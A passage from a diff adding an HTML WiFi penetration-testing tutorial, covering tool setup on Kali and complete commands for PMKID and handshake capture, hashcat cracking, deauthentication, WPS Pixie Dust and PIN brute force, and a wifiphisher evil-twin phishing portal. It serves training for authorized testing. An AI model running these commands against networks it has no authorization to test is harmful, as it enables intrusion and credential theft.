@@ -1,0 +1,1340 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>WiFi Penetration | Rajnish</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@300;400;500;600;700;800&display=swap');
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      --blue: #1A6FA8;
+      --dblue: #0D2137;
+      --lblue: #D0E8F8;
+      --red: #7B1818;
+      --lred: #FDECEA;
+      --green: #145A32;
+      --lgreen: #D4EDDA;
+      --orange: #7D3C00;
+      --lorange: #FFF0CC;
+      --teal: #0E6655;
+      --lteal: #D0EDE8;
+      --purple: #4A235A;
+      --lpurple: #EDE0F0;
+      --gray: #F7F7F7;
+      --dgray: #444;
+      --code-bg: #1E1E2E;
+      --code-blue: #9CDCFE;
+      --code-green: #6A9955;
+      --code-text: #D4D4D4;
+    }
+
+    ::-webkit-scrollbar {
+      width: 10px;
+    }
+
+    ::-webkit-scrollbar-track {
+      background: #f1f1f1;
+      padding: 5px;
+    }
+
+    ::-webkit-scrollbar-thumb {
+      background: var(--blue);
+      margin: 3px;
+      border-radius: 0;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      font-size: 16px;
+      color: #222;
+      background: #fff;
+      line-height: 1.6;
+    }
+
+    /* ── Page wrapper ── */
+    .doc {
+      max-width: 1000px;
+      margin: 40px auto;
+      padding: 0 32px;
+    }
+
+    /* ── Cover ── */
+    .cover {
+      background: linear-gradient(135deg, var(--dblue) 0%, #1A3A5C 60%, var(--blue) 100%);
+      color: #fff;
+      padding: 80px 60px 60px;
+      border-radius: 12px;
+      margin-bottom: 40px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .cover::before {
+      content: '';
+      position: absolute;
+      top: -80px;
+      right: -80px;
+      width: 300px;
+      height: 300px;
+      background: rgba(255, 255, 255, .04);
+      border-radius: 50%;
+    }
+
+    .cover-tag {
+      display: inline-block;
+      background: rgba(255, 255, 255, .15);
+      padding: 4px 14px;
+      border-radius: 20px;
+      font-size: 11px;
+      font-weight: 600;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      margin-bottom: 24px;
+    }
+
+    .cover h1 {
+      font-size: 38pt;
+      font-weight: 800;
+      line-height: 1.1;
+      margin-bottom: 16px;
+      letter-spacing: -1px;
+    }
+
+    .cover .subtitle {
+      font-size: 14pt;
+      opacity: .85;
+      margin-bottom: 28px;
+      font-weight: 300;
+    }
+
+    .cover .pills {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-bottom: 40px;
+    }
+
+    .pill {
+      background: rgba(255, 255, 255, .15);
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 10pt;
+      font-weight: 500;
+    }
+
+    .cover .disclaimer {
+      background: rgba(220, 50, 50, .25);
+      border: 1px solid rgba(220, 50, 50, .4);
+      border-radius: 8px;
+      padding: 14px 18px;
+      font-size: 10pt;
+      line-height: 1.5;
+    }
+
+    .cover .disclaimer strong {
+      color: #ffaaaa;
+    }
+
+    /* ── Chapter / Section headers ── */
+    .chapter {
+      border-left: 5px solid var(--blue);
+      background: linear-gradient(90deg, #EBF5FF, #fff);
+      padding: 18px 24px;
+      margin: 40px 0 20px;
+      border-radius: 0 8px 8px 0;
+    }
+
+    .chapter h2 {
+      font-size: 17pt;
+      font-weight: 800;
+      color: var(--dblue);
+      margin-bottom: 4px;
+    }
+
+    .chapter .ch-num {
+      font-size: 10pt;
+      color: var(--blue);
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    h3 {
+      font-size: 12pt;
+      font-weight: 700;
+      color: var(--blue);
+      margin: 24px 0 10px;
+      padding-bottom: 4px;
+      border-bottom: 2px solid #D0E8F8;
+    }
+
+    p {
+      margin: 8px 0;
+      font-size: 16px;
+    }
+
+    /* ── Code blocks ── */
+    .code-wrap {
+      background: var(--code-bg);
+      border-radius: 8px;
+      overflow: hidden;
+      margin: 14px 0;
+      border: 1px solid #333;
+    }
+
+    .code-title {
+      background: #1A3A5C;
+      padding: 6px 16px;
+      font-size: 10pt;
+      font-family: 'JetBrains Mono', monospace;
+      color: #A8D4F5;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .code-title::before {
+      content: '▶';
+      font-size: 7pt;
+      opacity: .7;
+    }
+
+    pre {
+      padding: 14px 18px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11pt;
+      line-height: 1.7;
+      overflow-x: auto;
+      color: var(--code-text);
+    }
+
+    .c {
+      color: var(--code-green);
+    }
+
+    /* comment */
+    .k {
+      color: var(--code-blue);
+    }
+
+    /* keyword/command */
+    .s {
+      color: #CE9178;
+    }
+
+    /* string/flag */
+    .n {
+      color: #DCDCAA;
+    }
+
+    /* normal highlight */
+
+    /* ── Info boxes ── */
+    .box {
+      display: flex;
+      gap: 0;
+      border-radius: 8px;
+      overflow: hidden;
+      margin: 14px 0;
+      border: 1px solid #ddd;
+    }
+
+    .box-icon {
+      width: 48px;
+      min-width: 48px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 18px;
+    }
+
+    .box-body {
+      padding: 12px 16px;
+    }
+
+    .box-body strong {
+      display: block;
+      font-size: 10pt;
+      margin-bottom: 4px;
+    }
+
+    .box-body p {
+      font-size: 10pt;
+      margin: 0;
+      line-height: 1.5;
+    }
+
+    .box-blue .box-icon {
+      background: var(--blue);
+    }
+
+    .box-blue .box-body {
+      background: var(--lblue);
+    }
+
+    .box-blue .box-body strong {
+      color: var(--dblue);
+    }
+
+    .box-red .box-icon {
+      background: var(--red);
+    }
+
+    .box-red .box-body {
+      background: var(--lred);
+    }
+
+    .box-red .box-body strong {
+      color: var(--red);
+    }
+
+    .box-green .box-icon {
+      background: var(--green);
+    }
+
+    .box-green .box-body {
+      background: var(--lgreen);
+    }
+
+    .box-green .box-body strong {
+      color: var(--green);
+    }
+
+    .box-orange .box-icon {
+      background: var(--orange);
+    }
+
+    .box-orange .box-body {
+      background: var(--lorange);
+    }
+
+    .box-orange .box-body strong {
+      color: var(--orange);
+    }
+
+    .box-teal .box-icon {
+      background: var(--teal);
+    }
+
+    .box-teal .box-body {
+      background: var(--lteal);
+    }
+
+    .box-teal .box-body strong {
+      color: var(--teal);
+    }
+
+    .box-purple .box-icon {
+      background: var(--purple);
+    }
+
+    .box-purple .box-body {
+      background: var(--lpurple);
+    }
+
+    .box-purple .box-body strong {
+      color: var(--purple);
+    }
+
+    /* ── Tables ── */
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 14px 0;
+      font-size: 9.5pt;
+    }
+
+    th {
+      background: var(--dblue);
+      color: #fff;
+      padding: 8px 10px;
+      text-align: left;
+      font-weight: 600;
+    }
+
+    td {
+      padding: 7px 10px;
+      border: 1px solid #ddd;
+    }
+
+    tr:nth-child(even) td {
+      background: #EBF3FB;
+    }
+
+    tr:nth-child(odd) td {
+      background: #fff;
+    }
+
+    /* ── Bullet lists ── */
+    ul {
+      padding-left: 20px;
+      margin: 8px 0;
+    }
+
+    li {
+      margin: 5px 0;
+      font-size: 10.5pt;
+    }
+
+    li::marker {
+      color: var(--blue);
+    }
+
+    /* ── Badges ── */
+    .badge {
+      display: inline-block;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-size: 8.5pt;
+      font-weight: 600;
+      margin-left: 6px;
+      vertical-align: middle;
+    }
+
+    .badge-new {
+      background: #D4EDDA;
+      color: var(--green);
+    }
+
+    .badge-warn {
+      background: #FDECEA;
+      color: var(--red);
+    }
+
+    .badge-info {
+      background: #D0E8F8;
+      color: var(--blue);
+    }
+
+    /* ── TOC ── */
+    .toc {
+      background: #F7F7F7;
+      border-radius: 8px;
+      padding: 20px 28px;
+      margin: 20px 0;
+    }
+
+    .toc h3 {
+      border: none;
+      margin-top: 0;
+      font-size: 12pt;
+      color: var(--dblue);
+    }
+
+    .toc-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: baseline;
+      padding: 5px 0;
+      border-bottom: 1px dotted #ccc;
+      font-size: 10pt;
+    }
+
+    .toc-item:last-child {
+      border: none;
+    }
+
+    .toc-item .toc-ch {
+      color: var(--blue);
+      font-weight: 700;
+      min-width: 90px;
+    }
+
+    .toc-item .toc-title {
+      flex: 1;
+    }
+
+    .toc-item .toc-tag {
+      font-size: 8.5pt;
+      color: #888;
+    }
+
+    hr.section {
+      border: none;
+      border-top: 2px solid #E0E0E0;
+      margin: 30px 0;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="doc">
+
+    <!-- ══ COVER ══════════════════════════════════════════ -->
+    <div class="cover">
+      <div class="cover-tag">Educational Guide</div>
+      <h1>WiFi Penetration<br>Testing</h1>
+      <div class="subtitle">2025 Edition — Updated Syntax &amp; Modern Techniques</div>
+      <div class="pills">
+        <span class="pill">hcxdumptool v7</span>
+        <span class="pill">hcxtools 6.x</span>
+        <span class="pill">hashcat -m 22000</span>
+        <span class="pill">Kali Linux 2025</span>
+        <span class="pill">WPA2 / WPA3</span>
+        <span class="pill">wifiphisher</span>
+        <span class="pill">bettercap</span>
+      </div>
+      <div class="disclaimer">
+        <strong>⚠ LEGAL DISCLAIMER</strong><br>
+        Strictly for educational use and authorized penetration testing on networks you own or have explicit written
+        permission to test. Unauthorized access is illegal under IT Act 2000 (India), CFAA (USA), and Computer Misuse
+        Act (UK). The author bears no responsibility for misuse.
+      </div>
+    </div>
+
+    <!-- TOC -->
+    <div class="toc">
+      <h3>📋 Table of Contents</h3>
+      <div class="toc-item"><span class="toc-ch">Intro</span><span class="toc-title">What Changed in 2025 — Breaking
+          Syntax Changes</span><span class="toc-tag">Read First</span></div>
+      <div class="toc-item"><span class="toc-ch">Chapter 0</span><span class="toc-title">Environment Setup — Kali 2025,
+          Tools, Adapters, Recon</span><span class="toc-tag">Setup</span></div>
+      <div class="toc-item"><span class="toc-ch">Chapter 1</span><span class="toc-title">PMKID Attack — Primary Method,
+          No Client Needed</span><span class="toc-tag">WPA2</span></div>
+      <div class="toc-item"><span class="toc-ch">Chapter 2</span><span class="toc-title">WPA2 Handshake — hcxdumptool +
+          aircrack-ng</span><span class="toc-tag">WPA2</span></div>
+      <div class="toc-item"><span class="toc-ch">Chapter 3</span><span class="toc-title">WPS Attacks — Pixie Dust &amp;
+          PIN Brute Force</span><span class="toc-tag">WPS</span></div>
+      <div class="toc-item"><span class="toc-ch">Chapter 4</span><span class="toc-title">Evil Twin / Rogue AP — Works on
+          WPA2 &amp; WPA3</span><span class="toc-tag">Social Eng</span></div>
+      <div class="toc-item"><span class="toc-ch">Chapter 5</span><span class="toc-title">WPA3 Testing — Transition Mode,
+          Dragonblood</span><span class="toc-tag">WPA3</span></div>
+      <div class="toc-item"><span class="toc-ch">Chapter 6</span><span class="toc-title">Advanced Hashcat — Smart
+          Pipeline, All Modes</span><span class="toc-tag">Cracking</span></div>
+      <div class="toc-item"><span class="toc-ch">Chapter 7</span><span class="toc-title">Post-Connection Analysis —
+          nmap, bettercap MitM</span><span class="toc-tag">Post-Exploit</span></div>
+      <div class="toc-item"><span class="toc-ch">Chapter 8</span><span class="toc-title">Full Attack Decision
+          Tree</span><span class="toc-tag">Reference</span></div>
+      <div class="toc-item"><span class="toc-ch">Chapter 9</span><span class="toc-title">Complete Cheat Sheet + AirFiber
+          Hardening</span><span class="toc-tag">Reference</span></div>
+    </div>
+
+    <!-- ══ WHAT CHANGED ════════════════════════════════════ -->
+    <div class="chapter page-break">
+      <div class="ch-num">Introduction</div>
+      <h2>What Changed in 2025 — Read This First</h2>
+    </div>
+    <p>Old tutorials break on Kali 2025 / kernel 6.12. These are the exact syntax changes that affect most commands:</p>
+
+    <table>
+      <tr>
+        <th>Tool / Version</th>
+        <th>Old (Broken)</th>
+        <th>✅ New 2025 Syntax</th>
+      </tr>
+      <tr>
+        <td>hcxdumptool ≥ 6.3</td>
+        <td><code>-o capture.pcapng</code></td>
+        <td><strong>-w capture.pcapng</strong></td>
+      </tr>
+      <tr>
+        <td>hcxdumptool ≥ 6.3</td>
+        <td><code>--enable_status=1</code></td>
+        <td><strong>--enable_status=15 or 31</strong></td>
+      </tr>
+      <tr>
+        <td>hcxdumptool v7</td>
+        <td>airmon-ng for monitor mode</td>
+        <td><strong>Tool sets monitor itself (nl80211)</strong></td>
+      </tr>
+      <tr>
+        <td>hcxdumptool v7</td>
+        <td><code>--filterlist_ap=file.txt</code></td>
+        <td><strong>--filterlist_ap=AABBCCDDEEFF</strong></td>
+      </tr>
+      <tr>
+        <td>hcxpcapngtool</td>
+        <td><code>-o hash.hc22000</code></td>
+        <td><strong>-o hash.22000</strong></td>
+      </tr>
+      <tr>
+        <td>hashcat</td>
+        <td><code>-m 2500</code> (deprecated)</td>
+        <td><strong>-m 22000 (unified WPA)</strong></td>
+      </tr>
+      <tr>
+        <td>monitor mode</td>
+        <td><code>iwconfig wlan0 mode monitor</code></td>
+        <td><strong>iw wlan0 set monitor none</strong></td>
+      </tr>
+      <tr>
+        <td>stop services</td>
+        <td><code>airmon-ng check kill</code></td>
+        <td><strong>systemctl stop NetworkManager wpa_supplicant</strong></td>
+      </tr>
+    </table>
+
+    <div class="box box-blue">
+      <div class="box-icon">💡</div>
+      <div class="box-body">
+        <strong>Why These Changes?</strong>
+        <p>hcxdumptool v7 dropped all WEXT (Wireless Extensions) code — deprecated since Linux kernel 6.3. Kali 2025
+          ships kernel 6.12. hashcat -m 2500 is removed in newer builds — mode 22000 handles PMKID and EAPOL handshake
+          in one unified format. Always build hcxdumptool from source for the latest syntax.</p>
+      </div>
+    </div>
+
+    <!-- ══ CHAPTER 0 ════════════════════════════════════════ -->
+    <div class="chapter page-break">
+      <div class="ch-num">Chapter 0</div>
+      <h2>Environment Setup (Kali 2025)</h2>
+    </div>
+
+    <h3>0.1 — Install &amp; Build Tools</h3>
+    <div class="code-wrap">
+      <div class="code-title">Terminal</div>
+      <pre><span class="c"># Update Kali 2025 fully first</span>
+<span class="k">sudo apt update && sudo apt full-upgrade -y</span>
+
+<span class="c"># Core wireless toolkit</span>
+<span class="k">sudo apt install -y hcxdumptool hcxtools hashcat aircrack-ng</span>
+<span class="k">sudo apt install -y reaver bully wifiphisher bettercap mdk4 nmap</span>
+
+<span class="c"># ─── Build hcxdumptool v7 from source (RECOMMENDED) ───</span>
+<span class="k">sudo apt install -y libpcap-dev libssl-dev</span>
+<span class="k">git clone https://github.com/ZerBea/hcxdumptool.git</span>
+<span class="k">cd hcxdumptool && make && sudo make install && cd ..</span>
+
+<span class="c"># ─── Build latest hcxtools ───</span>
+<span class="k">git clone https://github.com/ZerBea/hcxtools.git</span>
+<span class="k">cd hcxtools && make && sudo make install && cd ..</span>
+
+<span class="c"># Verify versions</span>
+hcxdumptool -v    <span class="c"># Should show v7.0.0 or higher</span>
+hcxpcapngtool -v  <span class="c"># Should show v6.3.5 or higher</span>
+hashcat -V        <span class="c"># Should show v6.2.x or higher</span></pre>
+    </div>
+
+    <div class="box box-orange">
+      <div class="box-icon">📦</div>
+      <div class="box-body">
+        <strong>Apt vs Source Build</strong>
+        <p>Kali apt packages are often months behind GitHub. hcxdumptool from apt may still be v6.x with different flags
+          — causing confusing errors. Build from source for correct 2025 syntax.</p>
+      </div>
+    </div>
+
+    <h3>0.2 — Set Wireless Regulatory Domain (Critical)</h3>
+    <p>Without this, packet injection fails silently. The #1 missed step by beginners.</p>
+    <div class="code-wrap">
+      <div class="code-title">Terminal</div>
+      <pre><span class="c"># Set your country code — enables correct TX power and channels</span>
+<span class="k">sudo iw reg set IN</span>   <span class="c"># India</span>
+<span class="k">sudo iw reg set US</span>   <span class="c"># United States</span>
+<span class="k">sudo iw reg set GB</span>   <span class="c"># United Kingdom</span>
+
+<span class="c"># Verify it was applied</span>
+iw reg get
+<span class="c"># Look for:  country IN: DFS-UNII</span>
+
+<span class="c"># Make it permanent (survives reboot)</span>
+<span class="k">echo 'REGDOMAIN=IN' | sudo tee /etc/default/crda</span></pre>
+    </div>
+
+    <h3>0.3 — Check Adapter Compatibility</h3>
+    <div class="code-wrap">
+      <div class="code-title">Terminal</div>
+      <pre><span class="c"># hcxdumptool has its own interface checker</span>
+hcxdumptool --list_interfaces
+
+<span class="c"># Example output:</span>
+<span class="c"># a0b4c5d6e7f8  wlan0  (mt76x2u)    &lt;-- MediaTek: BEST</span>
+<span class="c"># 00c0ca96cfcb  wlan1  (ath9k_htc)  &lt;-- Atheros: Good</span>
+
+<span class="c"># Test driver — must PASS both checks</span>
+<span class="k">sudo hcxdumptool -i wlan0 --check_driver</span>
+<span class="c"># PASS: driver supports monitor mode AND full packet injection</span>
+
+<span class="k">sudo hcxdumptool -i wlan0 --check_injection</span></pre>
+    </div>
+
+    <div class="box box-teal">
+      <div class="box-icon">🔌</div>
+      <div class="box-body">
+        <strong>Recommended Adapters 2025</strong>
+        <p><strong>Best:</strong> MediaTek MT7612U, MT7921 (active monitor + best injection). <strong>Good:</strong>
+          Atheros AR9271, Alfa AWUS036ACH. <strong>New:</strong> Nexmon on Raspberry Pi 4/5 in Kali 2025.3.
+          <strong>Avoid:</strong> Most Intel built-in WiFi cards (no injection support).
+        </p>
+      </div>
+    </div>
+
+    <h3>0.4 — Recon Scan (Always Do This First)</h3>
+    <div class="code-wrap">
+      <div class="code-title">Terminal</div>
+      <pre><span class="c"># Stop interfering services (hcxdumptool v7 handles monitor mode itself)</span>
+<span class="k">sudo systemctl stop NetworkManager</span>
+<span class="k">sudo systemctl stop wpa_supplicant</span>
+
+<span class="c"># Run recon for 30+ seconds</span>
+<span class="k">sudo hcxdumptool -i wlan0 --do_rcascan</span>
+
+<span class="c"># Output:</span>
+<span class="c"># BSSID           FREQ  CH  RSSI  ESSID</span>
+<span class="c"># aabbccddeeff    2437   6   -58   HomeNetwork</span>
+<span class="c"># 112233445566    5180  36   -72   AirFiber-5G</span>
+
+<span class="c"># Note BSSID (no colons) and FREQ (MHz) — NOT channel number</span>
+<span class="c"># 2412=ch1  2437=ch6  2462=ch11  5180=ch36  5745=ch149</span></pre>
+    </div>
+
+    <!-- ══ CHAPTER 1 ════════════════════════════════════════ -->
+    <div class="chapter page-break">
+      <div class="ch-num">Chapter 1</div>
+      <h2>PMKID Attack — Best Method 2025 <span class="badge badge-new">Primary</span></h2>
+    </div>
+    <p>No deauthentication needed, no waiting for clients. hcxdumptool connects to the AP and requests the PMKID
+      directly. <strong>Always try this first on WPA2 networks.</strong></p>
+
+    <h3>1.1 — Theory</h3>
+    <ul>
+      <li>AP sends a PMKID in the first EAPOL frame to any device attempting to connect</li>
+      <li><strong>PMKID = HMAC-SHA1-128(PMK, "PMK Name" + AP_MAC + Client_MAC)</strong></li>
+      <li>PMK is derived from the WiFi password — cracking PMKID reveals the password</li>
+      <li>hcxdumptool v7 probes the AP directly — zero real clients needed</li>
+    </ul>
+
+    <h3>1.2 — Stop Interfering Services (Mandatory)</h3>
+    <div class="code-wrap">
+      <div class="code-title">Terminal</div>
+      <pre><span class="c"># These fight with hcxdumptool for the interface</span>
+<span class="k">sudo systemctl stop NetworkManager</span>
+<span class="k">sudo systemctl stop wpa_supplicant</span>
+
+<span class="c"># Verify they are stopped</span>
+systemctl is-active NetworkManager  <span class="c"># Must output: inactive</span>
+systemctl is-active wpa_supplicant   <span class="c"># Must output: inactive</span></pre>
+    </div>
+
+    <div class="box box-red">
+      <div class="box-icon">⚠</div>
+      <div class="box-body">
+        <strong>Do NOT Use airmon-ng check kill</strong>
+        <p>airmon-ng check kill only kills processes — systemd restarts them. Use <code>systemctl stop</code>. Also:
+          hcxdumptool v7 sets monitor mode itself using nl80211. Do NOT pre-configure monitor mode with airmon-ng before
+          running hcxdumptool.</p>
+      </div>
+    </div>
+
+    <h3>1.3 — Capture PMKID (2025 Syntax)</h3>
+    <div class="code-wrap">
+      <div class="code-title">Terminal</div>
+      <pre><span class="c"># ─── TARGETED: Attack one specific AP ───</span>
+<span class="k">sudo hcxdumptool -i wlan0 \</span>
+  <span class="s">-w capture.pcapng \</span>
+  <span class="s">-c 2437 \</span>
+  <span class="s">--filterlist_ap=aabbccddeeff \</span>
+  <span class="s">--filtermode=2 \</span>
+  <span class="s">--enable_status=15</span>
+
+<span class="c"># Flag reference:</span>
+<span class="c"># -w                  = output file  (OLD guides use -o — WRONG)</span>
+<span class="c"># -c 2437             = frequency MHz (NOT channel number)</span>
+<span class="c"># --filterlist_ap     = BSSID without colons, no spaces</span>
+<span class="c"># --filtermode=2      = only interact with target in filterlist</span>
+<span class="c"># --enable_status=15  = show PMKID/handshake capture events</span>
+
+<span class="c"># ─── 5GHz target ───</span>
+<span class="k">sudo hcxdumptool -i wlan0 -w cap5g.pcapng \</span>
+  <span class="s">-c 5180 --filterlist_ap=112233445566 --filtermode=2 --enable_status=15</span>
+
+<span class="c"># ─── Scan ALL channels ───</span>
+<span class="k">sudo hcxdumptool -i wlan0 -w capall.pcapng -F --enable_status=15</span>
+
+<span class="c"># Run 2–5 minutes then Ctrl+C</span>
+<span class="c"># Watch for: PMKIDROGUE = PMKID captured  |  M1M2ROGUE = handshake</span></pre>
+    </div>
+
+    <div class="box box-blue">
+      <div class="box-icon">💡</div>
+      <div class="box-body">
+        <strong>Status Messages Decoded</strong>
+        <p><strong>PMKIDROGUE</strong> = PMKID captured from AP (best case). <strong>M1M2ROGUE</strong> = Partial
+          handshake from client (also crackable). <strong>M1M2M3M4</strong> = Full 4-way handshake. All types are
+          handled by hashcat -m 22000.</p>
+      </div>
+    </div>
+
+    <h3>1.4 — Extract Hash</h3>
+    <div class="code-wrap">
+      <div class="code-title">Terminal</div>
+      <pre><span class="c"># Convert pcapng → hashcat format 22000</span>
+<span class="k">hcxpcapngtool -o hash.22000 -E essids.txt capture.pcapng</span>
+
+<span class="c"># -o = hash file   -E = ESSID wordlist for smart cracking</span>
+
+<span class="c"># Verify capture</span>
+wc -l hash.22000
+<span class="c"># 0 = nothing captured   1+ = proceed to cracking</span>
+
+<span class="c"># Preview hash format</span>
+head -1 hash.22000
+<span class="c"># WPA*01*PMKID*AP_MAC*CLIENT_MAC*ESSID  (01 = PMKID)</span>
+<span class="c"># WPA*02*MIC*AP_MAC*CLIENT_MAC*ESSID    (02 = EAPOL)</span></pre>
+    </div>
+
+    <h3>1.5 — Crack with Hashcat (Recommended Order)</h3>
+    <div class="code-wrap">
+      <div class="code-title">Terminal</div>
+      <pre><span class="c"># -m 22000 handles BOTH PMKID and EAPOL in one unified mode</span>
+
+<span class="c"># ─── Step 1: Smart PSK candidates (fast — try first) ───</span>
+<span class="k">hcxpsktool -c hash.22000 | hashcat --stdin -m 22000 hash.22000</span>
+
+<span class="c"># ─── Step 2: Dictionary + best rules ───</span>
+<span class="k">hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt \</span>
+  <span class="s">-r /usr/share/hashcat/rules/best64.rule</span>
+
+<span class="c"># ─── Step 3: 8-digit brute force (common ISP defaults) ───</span>
+<span class="k">hashcat -m 22000 hash.22000 -a 3 ?d?d?d?d?d?d?d?d</span>
+
+<span class="c"># ─── Step 4: ESSID-based smart wordlist ───</span>
+<span class="k">hcxeiutool -i essids.txt -d dig.txt -c chr.txt -x hex.txt -s sc.txt</span>
+cat essids.txt dig.txt chr.txt hex.txt sc.txt | sort -u > smart.txt
+<span class="k">hashcat -m 22000 hash.22000 smart.txt</span>
+
+<span class="c"># ─── Show cracked result ───</span>
+<span class="k">hashcat -m 22000 hash.22000 --show</span></pre>
+    </div>
+
+    <!-- ══ CHAPTER 2 ════════════════════════════════════════ -->
+    <div class="chapter page-break">
+      <div class="ch-num">Chapter 2</div>
+      <h2>WPA2 Handshake Capture</h2>
+    </div>
+
+    <h3>2.1 — hcxdumptool Method (Captures Both PMKID + Handshake)</h3>
+    <div class="code-wrap">
+      <div class="code-title">Terminal</div>
+      <pre><span class="c"># Same command as PMKID — add --attemptclientmax for more handshake tries</span>
+<span class="k">sudo hcxdumptool -i wlan0 \</span>
+  <span class="s">-w capture.pcapng \</span>
+  <span class="s">-c 2437 \</span>
+  <span class="s">--filterlist_ap=aabbccddeeff \</span>
+  <span class="s">--filtermode=2 \</span>
+  <span class="s">--enable_status=15 \</span>
+  <span class="s">--attemptclientmax=10000</span>
+
+<span class="c"># Extract and crack:</span>
+<span class="k">hcxpcapngtool -o hash.22000 capture.pcapng</span>
+<span class="k">hashcat -m 22000 hash.22000 rockyou.txt -r best64.rule</span></pre>
+    </div>
+
+    <h3>2.2 — Classic aircrack-ng Method</h3>
+    <div class="code-wrap">
+      <div class="code-title">Terminal</div>
+      <pre><span class="c"># Monitor mode — modern nl80211 (no deprecation warnings)</span>
+<span class="k">sudo ip link set wlan0 down</span>
+<span class="k">sudo iw wlan0 set monitor none</span>
+<span class="k">sudo ip link set wlan0 up</span>
+
+<span class="c"># Or with airmon-ng (still works, kernel warnings on 6.3+):</span>
+<span class="k">sudo airmon-ng check kill && sudo airmon-ng start wlan0</span>
+
+<span class="c"># Scan networks</span>
+<span class="k">sudo airodump-ng wlan0mon</span>
+
+<span class="c"># Capture on target AP</span>
+<span class="k">sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w cap wlan0mon</span>
+
+<span class="c"># Deauth in new terminal</span>
+<span class="k">sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon</span>
+<span class="c"># Wait for: WPA handshake: AA:BB:CC:DD:EE:FF in top-right corner</span>
+
+<span class="c"># Crack — convert to 22000 first (faster with GPU)</span>
+<span class="k">hcxpcapngtool cap-01.cap -o hash.22000</span>
+<span class="k">hashcat -m 22000 hash.22000 rockyou.txt</span>
+
+<span class="c"># Or crack directly with aircrack-ng</span>
+<span class="k">aircrack-ng -w /usr/share/wordlists/rockyou.txt cap-01.cap</span></pre>
+    </div>
+
+    <!-- ══ CHAPTER 3 ════════════════════════════════════════ -->
+    <div class="chapter page-break">
+      <div class="ch-num">Chapter 3</div>
+      <h2>WPS Attacks — Pixie Dust &amp; PIN Brute Force</h2>
+    </div>
+
+    <div class="box box-orange">
+      <div class="box-icon">⚠</div>
+      <div class="box-body">
+        <strong>WPS in 2025</strong>
+        <p>Most modern routers ship with WPS disabled. Ubiquiti AirFiber never had WPS. Pixie Dust only works on old
+          Realtek/Ralink chipsets (pre-2018). Always check WPS status before attempting these attacks.</p>
+      </div>
+    </div>
+
+    <h3>3.1 — Scan for WPS</h3>
+    <div class="code-wrap">
+      <div class="code-title">Terminal</div>
+      <pre><span class="k">sudo airmon-ng start wlan0</span>
+<span class="k">sudo wash -i wlan0mon</span>
+
+<span class="c"># Output: BSSID | CH | dBm | WPS Version | WPS Locked | ESSID</span>
+<span class="c"># AA:BB:CC:DD:EE:FF  6  -65  2.0  No  HomeRouter</span>
+<span class="c">#                              ^^</span>
+<span class="c">#             WPS Locked = No → potentially vulnerable</span></pre>
+    </div>
+
+    <h3>3.2 — Pixie Dust Attack</h3>
+    <div class="code-wrap">
+      <div class="code-title">Terminal</div>
+      <pre><span class="c"># -K 1 = Pixie Dust mode — works in seconds if vulnerable</span>
+<span class="k">sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vvv</span>
+
+<span class="c"># Extra options for stubborn APs:</span>
+<span class="k">sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -N -S -vvv</span>
+<span class="c"># -N = no NACKs   -S = small DH keys</span>
+
+<span class="c"># Success output:</span>
+<span class="c"># [+] WPS PIN: '12345670'</span>
+<span class="c"># [+] WPA PSK: 'YourPassword'</span></pre>
+    </div>
+
+    <h3>3.3 — PIN Brute Force (Slow Fallback)</h3>
+    <div class="code-wrap">
+      <div class="code-title">Terminal</div>
+      <pre><span class="c"># With delays to avoid WPS lockout</span>
+<span class="k">sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -d 5 -r 3:60 -vvv</span>
+<span class="c"># -d 5 = 5s delay   -r 3:60 = sleep 60s after every 3 attempts</span>
+
+<span class="c"># bully alternative — handles some APs better</span>
+<span class="k">sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -d -v 3</span>
+
+<span class="c"># Resume an interrupted session</span>
+<span class="k">sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vvv -s /tmp/reaver.session</span></pre>
+    </div>
+
+    <!-- ══ CHAPTER 4 ════════════════════════════════════════ -->
+    <div class="chapter page-break">
+      <div class="ch-num">Chapter 4</div>
+      <h2>Evil Twin / Rogue AP <span class="badge badge-info">Works on WPA2 + WPA3</span></h2>
+    </div>
+    <p>Evil Twin bypasses encryption entirely via social engineering. It is the most reliable attack against WPA3 and
+      networks with strong passwords.</p>
+
+    <h3>4.1 — wifiphisher (Fully Automated — Recommended)</h3>
+    <div class="code-wrap">
+      <div class="code-title">Terminal</div>
+      <pre><span class="k">sudo apt install wifiphisher</span>
+
+<span class="c"># ─── Fully automated (prompts you to pick target) ───</span>
+<span class="k">sudo wifiphisher</span>
+
+<span class="c"># ─── Targeted attack with specific network ───</span>
+<span class="k">sudo wifiphisher \</span>
+  <span class="s">-aI wlan0 \</span>
+  <span class="s">-jI wlan1 \</span>
+  <span class="s">--essid 'HomeNetwork' \</span>
+  <span class="s">-p firmware-upgrade \</span>
+  <span class="s">--force-hostapd</span>
+
+<span class="c"># Flag reference:</span>
+<span class="c"># -aI wlan0           = AP interface (hosts the fake network)</span>
+<span class="c"># -jI wlan1           = Jamming interface (deauths real AP)</span>
+<span class="c"># --essid             = clone this network name</span>
+<span class="c"># -p firmware-upgrade = captive portal template (most convincing)</span>
+
